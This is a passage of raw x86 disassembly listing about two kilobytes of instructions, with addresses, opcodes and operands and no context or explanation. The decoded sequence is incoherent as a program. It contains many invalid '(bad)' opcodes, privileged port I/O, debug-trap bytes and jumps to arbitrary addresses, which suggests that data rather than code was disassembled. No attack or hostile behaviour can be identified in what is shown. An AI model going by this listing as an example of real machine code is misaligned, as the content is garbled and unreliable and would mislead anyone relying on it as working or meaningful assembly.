  421863:	mov    BYTE PTR [esi],bh
  421865:	mov    edi,0x80c07dca
  42186a:	sar    BYTE PTR [esi-0x6d],cl
  42186d:	fdiv   DWORD PTR [ecx+0x4c2dafcd]
  421873:	pop    esp
  421874:	dec    esp
  421875:	jg     0x4218b6
  421877:	pop    ss
  421878:	rol    ebp,cl
  42187a:	repnz (bad) 
  42187c:	js     0x42181f
  42187e:	and    edx,edi
  421880:	popa   
  421881:	neg    DWORD PTR [ebp-0x9f4bb3e]
  421887:	lock shl DWORD PTR [edx-0x22],0xbf
  42188c:	nop
  42188d:	test   al,0x4a
  42188f:	rol    ecx,1
  421891:	xchg   ecx,eax
  421892:	gs cs jo 0x4218c4
  421896:	jg     0x421894
  421898:	int3   
  421899:	scas   al,BYTE PTR es:[edi]
  42189a:	mov    BYTE PTR [ecx+0x755c95a3],bl
  4218a0:	adc    dl,BYTE PTR [ecx]
  4218a2:	pop    ecx
  4218a3:	jg     0x421847
  4218a5:	outs   dx,DWORD PTR ds:[esi]
  4218a6:	jmp    0xc398d5a5
  4218ab:	or     al,0x78
  4218ad:	push   es
  4218ae:	mov    ch,0xb3
  4218b0:	data16 fimul WORD PTR [edi+0xc757c0]
  4218b7:	cmp    al,0xe1
  4218b9:	push   es
  4218ba:	and    eax,0xb8523c1f
  4218bf:	call   0x17cd0b2a
  4218c4:	jnp    0x421862
  4218c6:	ret    0x7c84
  4218c9:	pop    ebp
  4218ca:	and    bh,bh
  4218cc:	cmp    bl,BYTE PTR [ecx+esi*8]
  4218cf:	add    BYTE PTR [bx+si],dl
  4218d2:	lock sbb esi,DWORD PTR [ebp+0x4cc592d7]
  4218d9:	mov    al,0x45
  4218db:	push   ss
  4218dc:	out    dx,al
  4218dd:	jno    0x4218f9
  4218df:	lods   al,BYTE PTR ds:[esi]
  4218e0:	inc    esp
  4218e1:	mov    ah,0xbf
  4218e3:	push   ss
  4218e4:	in     eax,dx
  4218e5:	in     eax,0xd5
  4218e7:	xchg   esi,eax
  4218e8:	mov    BYTE PTR [edx],al
  4218ea:	dec    ecx
  4218eb:	pop    es
  4218ec:	sub    BYTE PTR [ebx-0x4f],0x60
  4218f0:	ret    
  4218f1:	sub    edi,DWORD PTR [ecx-0x6f]
  4218f4:	sub    ah,al
  4218f6:	adc    al,0xa
  4218f8:	and    DWORD PTR [edi-0x70],ebp
  4218fb:	mov    ecx,0xfbf926ff
  421900:	popf   
  421901:	cld    
  421902:	ja     0x4218f6
  421904:	adc    DWORD PTR [ecx],0x70a8c0d9
  42190a:	icebp  
  42190b:	pop    esi
  42190c:	pop    ecx
  42190d:	sub    al,0x60
  42190f:	mov    dl,0x1b
  421911:	inc    eax
  421912:	adc    al,0xc2
  421914:	xor    bh,BYTE PTR [eax+0xd]
  421917:	das    
  421918:	(bad)  
  421919:	push   esi
  42191a:	xor    dh,bl
  42191c:	xor    edx,esi
  42191e:	bswap  esi
  421920:	(bad)  
  421921:	xor    eax,0x3aebb1e0
  421926:	lock cli 
  421928:	inc    edx
  421929:	mov    ds:0x2de557ea,al
  42192e:	jecxz  0x4219a7
  421930:	xchg   edi,eax
  421931:	xor    al,0x56
  421933:	push   esp
  421934:	addr16 mov eax,0x66fef409
  42193a:	dec    edx
  42193b:	mov    al,ds:0xfeebe5ff
  421940:	mov    eax,ds:0xb771cfcb
  421945:	jae    0x421941
  421947:	fstp   QWORD PTR [esi+edx*2+0x5c]
  42194b:	xor    ebx,DWORD PTR [ebp+eax*8-0xf]
  42194f:	or     eax,0xe0f42418
  421954:	shl    BYTE PTR [ebx],cl
  421956:	rcr    BYTE PTR [ebx],0x37
  421959:	and    eax,0x9ca5105a
  42195e:	push   es
  42195f:	pop    ebx
  421960:	outs   dx,DWORD PTR ds:[esi]
  421961:	dec    edx
  421962:	call   0x3b1f8efd
  421967:	mov    ah,BYTE PTR [ecx+0x4d]
  42196a:	xchg   esp,eax
  42196b:	lds    eax,FWORD PTR [ebx+0x55]
  42196e:	pop    ecx
  42196f:	mov    esi,DWORD PTR [edx-0x2b3d8a20]
  421975:	push   es
  421976:	ret    0x84a4
  421979:	xchg   esi,eax
  42197a:	mov    ds:0xc3042469,al
  42197f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421980:	xchg   ebp,eax
  421981:	cs mov ecx,0xc8952e3e
  421987:	mov    ecx,0xf621de54
  42198c:	sbb    al,0xd9
  42198e:	push   edx
  42198f:	call   0xd3a17f74
  421994:	mov    esp,DWORD PTR [ecx-0x67ef5a5d]
  42199a:	push   ss
  42199b:	dec    DWORD PTR [esi-0x75396f2a]
  4219a1:	jbe    0x42197c
  4219a3:	sbb    esi,DWORD PTR [esi+0x2e4fb314]
  4219a9:	push   DWORD PTR [esi-0x5197c2f]
  4219af:	xor    ch,BYTE PTR [ecx+0x4259900e]
  4219b5:	out    0x33,al
  4219b7:	xchg   DWORD PTR [esi+0x9c838d],ecx
  4219bd:	lock stc 
  4219bf:	mov    eax,ds:0xaa212de9
  4219c4:	or     bl,BYTE PTR [ecx+0x1f]
  4219c7:	shl    BYTE PTR [ebp-0x57],cl
  4219ca:	mov    cl,0x7d
  4219cc:	xchg   edx,eax
  4219cd:	(bad)  [ecx]
  4219cf:	aam    0x4c
  4219d1:	adc    eax,0x43c7e5d2
  4219d6:	sub    BYTE PTR gs:[edi+0x63],dl
  4219da:	scas   eax,DWORD PTR es:[edi]
  4219db:	mov    ds:0xb122fb5d,eax
  4219e0:	cmp    al,0x33
  4219e2:	(bad)  
  4219e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219e4:	mov    bh,0x77
  4219e6:	adc    al,0xdd
  4219e8:	fs sub dh,ah
  4219eb:	mov    edx,0x450ad67c
  4219f0:	jb     0x421a6a
  4219f2:	rcr    DWORD PTR [esi],0x88
  4219f5:	gs cmp al,0x86
  4219f8:	adc    BYTE PTR [ebx+0x6ac997c1],cl
  4219fe:	sti    
  4219ff:	pop    ss
  421a00:	loope  0x421993
  421a02:	xchg   esi,eax
  421a03:	push   0xffffffb2
  421a05:	mov    edx,DWORD PTR [ebp-0x5b]
  421a08:	inc    esp
  421a09:	cmp    bh,al
  421a0b:	or     DWORD PTR [edi],eax
  421a0d:	adc    DWORD PTR [eax+0x183c2ff2],ebp
  421a13:	cld    
  421a14:	fidivr DWORD PTR [edx]
  421a16:	(bad)  
  421a17:	mov    eax,0x13b95c83
  421a1c:	in     eax,0x5a
  421a1e:	call   0x774:0xb4ed7824
  421a25:	jge    0x421a6c
  421a27:	sbb    BYTE PTR [esp+edx*4+0x65],bh
  421a2b:	(bad)  
  421a2c:	sub    dl,BYTE PTR [eax*1+0x469dfae4]
  421a33:	sti    
  421a34:	(bad)  
  421a35:	dec    ebp
  421a36:	sti    
  421a37:	pop    esp
  421a38:	fcomp  DWORD PTR [ebx-0x20b41c27]
  421a3e:	fisttp WORD PTR [edx+0x188e9a7f]
  421a44:	sbb    al,0x25
  421a46:	das    
  421a47:	lds    eax,FWORD PTR [edx-0x34]
  421a4a:	sbb    edi,ebx
  421a4c:	imul   edi,DWORD PTR [esi],0x55
  421a4f:	dec    ebp
  421a50:	imul   DWORD PTR [eax]
  421a52:	bound  eax,QWORD PTR [esp-0x68]
  421a56:	jmp    0x421a26
  421a58:	sbb    dl,dh
  421a5a:	leave  
  421a5b:	fidivr WORD PTR [edi-0x3]
  421a5e:	mov    esp,0xae298c2f
  421a63:	xor    BYTE PTR [edi-0x553189e1],0xb6
  421a6a:	mov    eax,ds:0x2fbc581d
  421a6f:	stc    
  421a70:	outs   dx,DWORD PTR ds:[esi]
  421a71:	jmp    0x421a17
  421a73:	dec    eax
  421a74:	inc    ecx
  421a75:	xchg   esi,eax
  421a76:	call   0x837f944c
  421a7b:	pop    ebp
  421a7c:	dec    ebx
  421a7d:	and    eax,0x6d122316
  421a82:	ror    ebx,cl
  421a84:	mov    dl,0x9e
  421a86:	and    BYTE PTR [eax],ah
  421a88:	pop    esp
  421a89:	xchg   esp,eax
  421a8a:	out    dx,eax
  421a8b:	dec    ebp
  421a8c:	mov    al,ds:0xde4ba7c9
  421a91:	out    0x36,al
  421a93:	pop    ebx
  421a94:	pop    edx
  421a95:	rcl    dh,0x9
  421a98:	cmp    eax,0x4286b13a
  421a9d:	jb     0x421afa
  421a9f:	push   eax
  421aa0:	icebp  
  421aa1:	push   cs
  421aa2:	repnz mov ah,0xa3
  421aa5:	xchg   BYTE PTR [ecx-0x31],ah
  421aa8:	sbb    bh,0x4e
  421aab:	pop    es
  421aac:	out    dx,al
  421aad:	jge    0x421a3c
  421aaf:	or     eax,0x352294d4
  421ab4:	jmp    0x69f030ab
  421ab9:	(bad)  
  421aba:	mov    ecx,0xe38b120d
  421abf:	mov    ch,BYTE PTR [eax+0x34]
  421ac2:	loopne 0x421acb
  421ac4:	dec    eax
  421ac5:	inc    esp
  421ac6:	(bad)  
  421ac7:	psrlq  mm7,QWORD PTR [edx+0x52ccd295]
  421ace:	lock scas al,BYTE PTR es:[edi]
  421ad0:	or     DWORD PTR [edi-0x18c4121d],ebp
  421ad6:	and    ebp,DWORD PTR [ebx+0x21]
  421ad9:	cwde   
  421ada:	test   al,0x73
  421adc:	pop    esi
  421add:	js     0x421a90
  421adf:	nop
  421ae0:	sub    esp,esp
  421ae2:	mov    al,0xc9
  421ae4:	fild   QWORD PTR [ecx]
  421ae7:	sbb    eax,0xb73039c8
  421aec:	sub    eax,0x9975093d
  421af1:	mov    ebp,0x994ab918
  421af6:	push   0x2733a82f
  421afb:	js     0x421afe
  421afd:	push   es
  421afe:	jne    0x421b3d
  421b00:	mov    ebp,DWORD PTR [edi-0x43]
  421b03:	push   eax
  421b04:	aad    0xc3
  421b06:	test   eax,0xed00ac66
  421b0b:	fwait
  421b0c:	imul   ecx,DWORD PTR [esi-0xc],0x355a95bc
  421b13:	fdiv   QWORD PTR ss:[ebp-0x48624db5]
  421b1a:	or     ebx,ebp
  421b1c:	pop    edi
  421b1d:	loop   0x421b86
  421b1f:	mov    edx,0x1d833a7a
  421b24:	pop    ds
  421b25:	add    DWORD PTR [edi+eax*8-0x3f],0x904c8d3f
  421b2d:	cmp    esp,DWORD PTR [ebp-0x4e07b0de]
  421b33:	cdq    
  421b34:	pop    ebp
  421b35:	sub    al,0x59
  421b37:	xlat   BYTE PTR ds:[ebx]
  421b38:	cmp    ch,al
  421b3a:	popf   
  421b3b:	jmp    0x421b55
  421b3d:	rol    DWORD PTR [ecx+0x20756fbb],0x47
  421b44:	sti    
  421b45:	int3   
  421b46:	ins    DWORD PTR es:[edi],dx
  421b47:	scas   eax,DWORD PTR es:[edi]
  421b48:	adc    eax,0x203b1615
  421b4d:	sbb    BYTE PTR [esp+ebx*4+0x59d519b0],dl
  421b54:	jo     0x421b79
  421b56:	(bad)  
  421b57:	sbb    DWORD PTR [edx],edx
  421b59:	into   
  421b5a:	(bad)  
  421b5b:	mov    al,ds:0xe4f2a2d8
  421b60:	mov    esp,0x2897a1f8
  421b65:	bound  eax,QWORD PTR [ecx+eiz*2-0x436b21b9]
  421b6c:	fbstp  TBYTE PTR [ebp+0x74]
  421b6f:	mov    esi,0x81667adc
  421b74:	cmp    ebx,0x1d9601c6
  421b7a:	add    edi,DWORD PTR ds:[ecx-0x5f]
  421b7e:	je     0x421bff
  421b80:	and    BYTE PTR [edi-0x1f422c68],al
  421b86:	mov    esp,0xe2982556
  421b8b:	shl    BYTE PTR [edx],cl
  421b8d:	push   eax
  421b8e:	or     bh,BYTE PTR [edi]
  421b90:	xchg   ebx,eax
  421b91:	icebp  
  421b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b93:	and    al,0x43
  421b95:	or     ebp,DWORD PTR [ecx-0x41]
  421b98:	ror    DWORD PTR [esi+edi*4],cl
  421b9b:	xor    BYTE PTR [ecx+0x0],0x0
  421ba2:	sbb    edi,DWORD PTR [esi-0x25106512]
  421ba8:	jg     0x421b69
  421baa:	call   0xb38e:0xdc770da0
  421bb1:	mov    ds:0x1957e,al
  421bb6:	repz add al,0x0
  421bb9:	add    BYTE PTR [esi+0x71],ch
  421bbc:	xchg   ecx,eax
  421bbd:	fnstenv [edx]
  421bbf:	xchg   ebx,eax
  421bc0:	add    al,0xbb
  421bc2:	popf   
  421bc3:	adc    BYTE PTR [esi-0x13],dl
  421bc6:	stc    
  421bc7:	sbb    al,0xf0
  421bc9:	cli    
  421bca:	shr    DWORD PTR cs:[eax+edi*4-0x698d6d40],0x63
  421bd3:	jmp    0x421c32
  421bd5:	sbb    edx,DWORD PTR [eax+0x28]
  421bd8:	sub    esp,DWORD PTR [ecx]
  421bda:	mov    BYTE PTR [eax+ebp*2-0x770864c5],bh
  421be1:	mov    ch,0x41
  421be3:	cmp    ch,cl
  421be5:	outs   dx,DWORD PTR ds:[esi]
  421be6:	cpuid  
  421be8:	mov    ebx,0xb3811397
  421bed:	ret    
  421bee:	mov    ss,WORD PTR [ebx+0x5b]
  421bf1:	in     eax,0xb3
  421bf3:	and    DWORD PTR [eax+0x1b5b1cb2],edx
  421bf9:	fisub  DWORD PTR [ecx-0x2b]
  421bfc:	add    al,0xc0
  421bfe:	inc    ebp
  421bff:	inc    edx
  421c00:	pop    ebp
  421c01:	sub    eax,0xf23be437
  421c06:	inc    eax
  421c07:	mov    ds:0x4c28ace,al
  421c0c:	mov    al,ds:0x5ebf743d
  421c11:	and    dl,BYTE PTR [ecx+eax*1+0x1b985010]
  421c18:	addr16 and al,0x1a
  421c1b:	enter  0x74d2,0xd1
  421c1f:	push   ecx
  421c20:	xchg   ebp,eax
  421c21:	rol    BYTE PTR [ecx],1
  421c23:	sub    edx,DWORD PTR [eax+ecx*4]
  421c26:	out    0xba,eax
  421c28:	out    dx,al
  421c29:	ss ins DWORD PTR es:[edi],dx
  421c2b:	xchg   ebp,eax
  421c2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c2d:	dec    eax
  421c2e:	jae    0x421c79
  421c30:	xor    DWORD PTR [esi+0x6d],esp
  421c33:	rcl    BYTE PTR [ebx+0x3e],0xf2
  421c37:	dec    edx
  421c38:	adc    eax,0xe9c7e0d9
  421c3d:	int3   
  421c3e:	mov    al,0xe0
  421c40:	pop    ebx
  421c41:	inc    edi
  421c42:	dec    ecx
  421c43:	icebp  
  421c44:	or     BYTE PTR [eax],dh
  421c46:	sbb    dl,BYTE PTR [edx+0x3a]
  421c49:	sub    eax,0xe11cf4a9
  421c4e:	jo     0x421c2e
  421c50:	shl    ch,cl
  421c52:	dec    esi
  421c53:	adc    eax,0x944df65a
  421c58:	xchg   esi,eax
  421c59:	jns    0x421c10
  421c5b:	jl     0x421c4c
  421c5d:	xchg   esp,eax
  421c5e:	out    dx,al
  421c5f:	adc    dl,ah
  421c61:	add    eax,eax
  421c63:	push   cs
  421c64:	mov    cl,0xbd
  421c66:	ror    DWORD PTR [eax-0x7b],0x65
  421c6a:	ret    0x391
  421c6d:	cs test eax,0x6176f916
  421c73:	and    eax,0x6588fada
  421c78:	mov    esi,0xf1f2cbac
  421c7d:	scas   eax,DWORD PTR es:[edi]
  421c7e:	and    eax,0x857db218
  421c83:	arpl   WORD PTR [esi-0x31],cx
  421c86:	jl     0x421cb2
  421c88:	dec    ebx
  421c89:	jle    0x421c45
  421c8b:	jge    0x421ce4
  421c8d:	loop   0x421c1f
  421c8f:	push   edi
  421c90:	pop    ebx
  421c91:	xchg   esp,eax
  421c92:	xchg   esi,eax
  421c93:	sbb    ecx,ebp
  421c95:	mov    edx,0xb3c62b71
  421c9a:	xchg   BYTE PTR [eax-0x7d],dl
  421c9d:	fucomi st,st(1)
  421ca0:	imul   edi,DWORD PTR [ebx+0x5],0xec15ec64
  421ca7:	repz popa 
  421ca9:	clc    
  421caa:	push   ebp
  421cab:	xchg   esi,eax
  421cac:	pop    ebp
  421cad:	retf   
  421cae:	mov    DWORD PTR [ecx+0x5085f47d],0x56a3de96
  421cb8:	fs ja  0x421c7e
  421cbb:	pop    edi
  421cbc:	xor    BYTE PTR [ebp+edx*2+0x7c],dl
  421cc0:	sahf   
  421cc1:	jl     0x421c5f
  421cc3:	adc    DWORD PTR [ecx+0x1f],edx
  421cc6:	into   
  421cc7:	int3   
  421cc8:	fs int3 
  421cca:	mov    ss,WORD PTR [bx+di+0x2abc]
  421ccf:	outs   dx,BYTE PTR ds:[esi]
  421cd0:	(bad)  
  421cd1:	(bad)  [ebx-0x43]
  421cd4:	enter  0x76c2,0xc5
  421cd8:	call   0x9d83fec6
  421cdd:	xchg   esi,eax
  421cde:	inc    edx
  421cdf:	mov    ds:0xdfba6fbb,al
  421ce4:	mov    DWORD PTR [esp+ebx*1+0x5825b68d],edi
  421ceb:	mul    DWORD PTR [eax+0x350ed5c]
  421cf1:	test   BYTE PTR [esi-0xd],ah
  421cf4:	xor    al,BYTE PTR [esi]
  421cf6:	call   0x61deaa38
  421cfb:	(bad)  
  421cfc:	aas    
  421cfd:	dec    edi
  421cfe:	fnstenv [edx+0x7443213d]
  421d04:	shl    DWORD PTR [ebx+0x74],cl
  421d07:	push   0xf8f4071a
  421d0c:	pusha  
  421d0d:	lock mov cl,0x9b
  421d10:	mov    WORD PTR [edx+eax*8+0xb],fs
  421d14:	outs   dx,DWORD PTR ds:[esi]
  421d15:	ffree  st(6)
  421d17:	rcr    DWORD PTR [edx-0x62db1f7d],cl
  421d1d:	mov    dl,0x37
  421d1f:	push   ss
  421d20:	ret    0x5151
  421d23:	or     esp,esi
  421d25:	adc    al,0xea
  421d27:	mov    ch,0xa3
  421d29:	xor    al,0x50
  421d2b:	jae    0x421d70
  421d2d:	add    cl,bh
  421d2f:	pop    ecx
  421d30:	push   ecx
  421d31:	mov    al,0xb6
  421d33:	retf   
  421d34:	adc    eax,0x2b78d81d
  421d39:	pop    ecx
  421d3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d3b:	aam    0xd
  421d3d:	dec    eax
  421d3e:	or     eax,0x7fbfc299
  421d43:	stos   BYTE PTR es:[edi],al
  421d44:	int3   
  421d45:	es or  eax,0xe7ff4843
  421d4b:	sbb    eax,DWORD PTR [eax+0x8]
  421d4e:	mov    ah,0xd0
  421d50:	mov    ds:0xdbe35bc,eax
  421d55:	sahf   
  421d56:	lods   eax,DWORD PTR ds:[esi]
  421d57:	jg     0x421da3
  421d59:	lods   eax,DWORD PTR ds:[esi]
  421d5a:	push   0xc604884
  421d5f:	fdivrp st(7),st
  421d61:	ins    BYTE PTR es:[edi],dx
  421d62:	retf   0xee2f
  421d65:	stos   DWORD PTR es:[edi],eax
  421d66:	cmp    ecx,DWORD PTR [ebp-0x43fd4839]
  421d6c:	addr16 mov edx,0xc8bf22e8
  421d72:	and    eax,0x8912ce2d
  421d77:	mov    ds:0x8a7aa0f3,eax
  421d7c:	and    dh,al
  421d7e:	mov    esp,DWORD PTR [ecx]
  421d80:	mov    bl,al
  421d82:	add    al,0xd1
  421d84:	and    ah,BYTE PTR [esp+ebp*4+0x4]
  421d88:	gs out 0x88,eax
  421d8b:	test   DWORD PTR [ebx],eax
  421d8d:	fisub  DWORD PTR [ebx+ebx*4+0x66]
  421d91:	sbb    ch,cl
  421d93:	jne    0x421dc1
  421d95:	xchg   edi,eax
  421d96:	sbb    edx,DWORD PTR [ebx+eax*4]
  421d99:	mov    edi,0xb306841d
  421d9e:	pop    es
  421d9f:	mov    ecx,0x6fa18a9b
  421da4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421da5:	xor    al,0xd6
  421da7:	aad    0x51
  421da9:	and    DWORD PTR [esi+ecx*4-0xd75aee5],esp
  421db0:	cmp    eax,0x3b207327
  421db5:	dec    ebp
  421db6:	aas    
  421db7:	xchg   ebx,eax
  421db8:	popf   
  421db9:	push   ds
  421dba:	(bad)  
  421dbc:	jge    0x421dcd
  421dbe:	or     BYTE PTR [edx-0x17],ah
  421dc1:	ret    0xb955
  421dc4:	mov    ch,0x4e
  421dc6:	mov    eax,0xfde96e1
  421dcb:	rcr    edx,cl
  421dcd:	nop
  421dce:	lahf   
  421dcf:	pushf  
  421dd0:	inc    ebp
  421dd1:	int3   
  421dd2:	mov    edi,0x80d4a16f
  421dd7:	test   BYTE PTR [edi-0x4cf6470e],dl
  421ddd:	jp     0x421d9d
  421ddf:	inc    ebx
  421de0:	mov    DWORD PTR [edi+ecx*1],edi
  421de3:	push   edx
  421de4:	xor    al,0x80
  421de6:	retf   
  421de7:	bound  esi,QWORD PTR [edx]
  421de9:	stos   DWORD PTR es:[edi],eax
  421dea:	pop    ebx
  421deb:	clc    
  421dec:	aaa    
  421ded:	adc    ebx,esp
  421def:	jne    0x421dba
  421df1:	mov    esp,0xd4d9e192
  421df6:	shl    dl,cl
  421df8:	imul   esp
  421dfa:	inc    dx
  421dfc:	cmp    bh,BYTE PTR [ebx+0x5168707b]
  421e02:	jmp    0x421e6d
  421e04:	pop    ds
  421e05:	jle    0x421dae
  421e07:	sbb    DWORD PTR [ebp+0x7824dedc],0x5d
  421e0e:	int    0x97
  421e10:	ss dec edi
  421e12:	sar    bl,1
  421e14:	les    eax,FWORD PTR [ebp+0x1bb0e93c]
  421e1a:	gs mov ecx,0x703b190
  421e20:	rol    DWORD PTR [ebp-0x26],cl
  421e23:	out    0xd8,eax
  421e25:	ret    
  421e26:	mov    dl,BYTE PTR [esi]
  421e28:	push   es
  421e29:	and    edx,DWORD PTR ds:0x64555215
  421e2f:	jae    0x421e91
  421e31:	mov    bh,0xc6
  421e33:	mov    edx,0x31e38bd1
  421e38:	sub    dl,BYTE PTR [ebx-0x29]
  421e3b:	(bad)  
  421e3c:	xchg   ebp,eax
  421e3d:	cmp    al,0xf0
  421e3f:	outs   dx,DWORD PTR ds:[esi]
  421e40:	lds    ecx,FWORD PTR [edi+0x5a368130]
  421e46:	inc    edx
  421e47:	push   ebx
  421e48:	add    bh,dh
  421e4a:	xchg   ecx,eax
  421e4b:	pop    ebx
  421e4c:	addr16 xchg ebx,eax
  421e4e:	inc    esp
  421e4f:	out    0xfa,eax
  421e51:	add    DWORD PTR [eax+ebx*4-0x6c9974e4],0x5bdab12d
  421e5c:	mov    bl,0x68
  421e5e:	test   al,0x7b
  421e60:	clc    
  421e61:	sub    BYTE PTR [esp+edx*1],ch
  421e64:	and    eax,0xe9e2eac1
  421e69:	lahf   
  421e6a:	shr    DWORD PTR [edx+0x70ff943b],1
  421e70:	cmp    ecx,DWORD PTR ds:[ebp+0x5d]
  421e74:	mov    bh,0xf5
  421e76:	sbb    edi,edi
  421e78:	add    esi,esi
  421e7a:	stos   DWORD PTR es:[edi],eax
  421e7b:	daa    
  421e7c:	inc    edx
  421e7d:	fld    QWORD PTR [eax+0x22]
  421e80:	aam    0xbd
  421e82:	js     0x421e94
  421e84:	(bad)  
  421e85:	mov    al,ds:0xc346f1a2
  421e8a:	sahf   
  421e8b:	xlat   BYTE PTR ds:[ebx]
  421e8c:	push   ds
  421e8d:	and    dh,dh
  421e8f:	arpl   di,dx
  421e91:	mov    ds:0xc4a6621a,al
  421e96:	fadd   QWORD PTR [edi+0x5000d824]
  421e9c:	sub    al,0x2a
  421e9e:	jb     0x421edd
  421ea0:	lods   eax,DWORD PTR ds:[esi]
  421ea1:	add    BYTE PTR [eax],al
  421ea3:	fwait
  421ea4:	std    
  421ea5:	inc    esi
  421ea6:	mov    ch,0xec
  421ea8:	retf   
  421ea9:	or     DWORD PTR [edi],0x952f7ef0
  421eaf:	test   eax,0x36592a1d
  421eb4:	gs mov ebp,0x8689a0a7
  421eba:	retf   0xa0d6
  421ebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ebe:	cmc    
  421ebf:	mov    bl,0x1b
  421ec1:	push   eax
  421ec2:	sub    DWORD PTR [edi],ebx
  421ec4:	push   ebx
  421ec5:	into   
  421ec6:	dec    eax
  421ec7:	scas   eax,DWORD PTR es:[edi]
  421ec8:	clc    
  421ec9:	mov    esp,0x37f2ae95
  421ece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ecf:	cmp    al,0x8f
  421ed1:	jle    0x421f11
  421ed3:	(bad)  
  421ed4:	mov    edx,0x9c99ec9a
  421ed9:	in     eax,dx
  421eda:	ror    BYTE PTR [edx-0x64],cl
  421edd:	fisub  WORD PTR [esi+0x2]
  421ee0:	mov    esp,0x41853c6b
  421ee5:	arpl   WORD PTR [ebp-0xe],bp
  421ee8:	cmp    DWORD PTR [eax+0x467c6f08],esp
  421eee:	jmp    0x421ec7
  421ef0:	mov    ds:0x9538473f,eax
  421ef5:	dec    ecx
  421ef6:	mov    cl,0x20
  421ef8:	pop    es
  421ef9:	add    BYTE PTR [ebp-0x762bc83],dl
  421eff:	xchg   ecx,eax
  421f00:	pop    ecx
  421f01:	jnp    0x421eac
  421f03:	scas   al,BYTE PTR es:[edi]
  421f04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f05:	cmp    al,0x61
  421f07:	lock and ch,BYTE PTR [ecx+0x65]
  421f0b:	push   0x2e
  421f0d:	cmp    bl,bl
  421f0f:	bound  esi,QWORD PTR [eax-0x25b74c96]
  421f15:	loopne 0x421e9f
  421f17:	popa   
  421f18:	cmp    BYTE PTR [ebx-0x13],cl
  421f1b:	adc    DWORD PTR [ecx],esp
  421f1d:	mov    fs:0x35c30700,al
  421f23:	es iret 
  421f25:	ins    BYTE PTR es:[edi],dx
  421f26:	cmp    DWORD PTR [edi],edi
  421f28:	rol    BYTE PTR [esi],0x35
  421f2b:	pushf  
  421f2c:	xlat   BYTE PTR ds:[ebx]
  421f2d:	outs   dx,DWORD PTR ds:[esi]
  421f2e:	(bad)  
  421f2f:	(bad)  
  421f30:	and    al,0x16
  421f32:	mov    ebp,0xf4bedeb0
  421f37:	mov    ds:0xbbac5539,eax
  421f3c:	das    
  421f3d:	aam    0x60
  421f3f:	ret    0xf7ea
  421f42:	imul   esi,esi,0x9dc1f6a8
  421f48:	pop    edx
  421f49:	cmp    ch,BYTE PTR [edi+ebp*8-0x26]
  421f4d:	rcl    BYTE PTR [ebp-0x1e],1
  421f50:	dec    ecx
  421f51:	bound  ebx,QWORD PTR [esi+ebp*2]
  421f54:	lahf   
  421f55:	(bad)  
  421f56:	ins    DWORD PTR es:[edi],dx
  421f57:	sbb    BYTE PTR [ebx],ah
  421f59:	cwde   
  421f5a:	mov    gs,WORD PTR fs:[esi+edi*2+0x24]
  421f5f:	or     BYTE PTR [ebx-0x5d],ch
  421f62:	mov    eax,0x859eaf81
  421f67:	push   ds
  421f68:	stos   BYTE PTR es:[edi],al
  421f69:	je     0x421f30
  421f6b:	push   esp
  421f6c:	inc    ebx
  421f6d:	adc    al,0x3d
  421f6f:	adc    cl,BYTE PTR [esi-0x183f413d]
  421f75:	adc    al,0x60
  421f77:	cmp    dh,dl
  421f79:	out    0x68,al
  421f7b:	es mov edx,0x5c4bf1c3
  421f81:	xchg   esp,eax
  421f82:	je     0x421f0f
  421f84:	add    ch,cl
  421f86:	adc    esi,DWORD PTR [edx+edx*1+0x2d]
  421f8a:	push   cs
  421f8b:	inc    esi
  421f8c:	add    eax,0x9001bef6
  421f91:	jle    0x421fd3
  421f93:	push   ds
  421f94:	jno    0x421f97
  421f96:	adc    eax,0x744030a2
  421f9b:	add    esp,DWORD PTR [ebx-0xfd5b769]
  421fa1:	in     eax,0xe2
  421fa3:	jle    0x421f74
  421fa5:	(bad)  
  421fa6:	sub    edi,DWORD PTR [ecx]
  421fa8:	xchg   ecx,eax
  421fa9:	iret   
  421faa:	mov    ebp,0xc4888671
  421faf:	xchg   edi,eax
  421fb0:	push   esp
  421fb1:	add    bl,ah
  421fb3:	repnz cs push 0xd8b510fd
  421fba:	(bad)  
  421fbb:	adc    eax,0x974af4f9
  421fc0:	push   edx
  421fc1:	xchg   edx,eax
  421fc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fc3:	xchg   ebp,eax
  421fc4:	outs   dx,BYTE PTR ds:[esi]
  421fc5:	xchg   ebx,eax
  421fc6:	cdq    
  421fc7:	cmc    
  421fc8:	shl    DWORD PTR [ecx+0x10c4211b],0x50
  421fcf:	xchg   ebx,eax
  421fd0:	daa    
  421fd1:	xor    BYTE PTR [edi],bl
  421fd3:	stos   DWORD PTR es:[edi],eax
  421fd4:	push   0x6f
  421fd6:	push   0x48
  421fd8:	sbb    eax,esi
  421fda:	sbb    eax,0x58a4d7c8
  421fdf:	es mov bl,0xcd
  421fe2:	out    0xd2,al
  421fe4:	sbb    BYTE PTR [esi-0x3c8ed1ae],0x2a
  421feb:	xchg   ebx,eax
  421fec:	jecxz  0x42200d
  421fee:	pop    edx
  421fef:	in     eax,0xa8
  421ff1:	mov    eax,0xd48c31e9
  421ff6:	or     eax,0x6268f1c2
  421ffb:	fimul  DWORD PTR [esi-0x69]
  421ffe:	loope  0x421fcc
  422000:	sbb    BYTE PTR [esi+ecx*1+0x3cecf54],bh
  422007:	icebp  
  422008:	nop
  422009:	adc    esp,DWORD PTR [edi+0x59]
  42200c:	cmp    BYTE PTR [edx],dl
  42200e:	sbb    eax,0xb97e7d74
  422013:	pandn  mm5,QWORD PTR [ebp-0x40044ef1]
  42201a:	sub    al,0x57
  42201c:	fstp   QWORD PTR [ebp-0x2]
  42201f:	ins    BYTE PTR es:[edi],dx
  422020:	xor    eax,DWORD PTR [ecx]
  422022:	pop    es
  422023:	(bad)  
  422025:	stc    
  422026:	ror    dh,cl
  422028:	mov    ds:0xffff82ac,al
  42202d:	xor    esi,DWORD PTR [esi-0x75e85802]
  422033:	imul   DWORD PTR [ebp-0x27]
  422036:	xor    al,0x56
  422038:	shr    ebx,0x8f
  42203b:	aad    0xc1
  42203d:	or     al,0x29
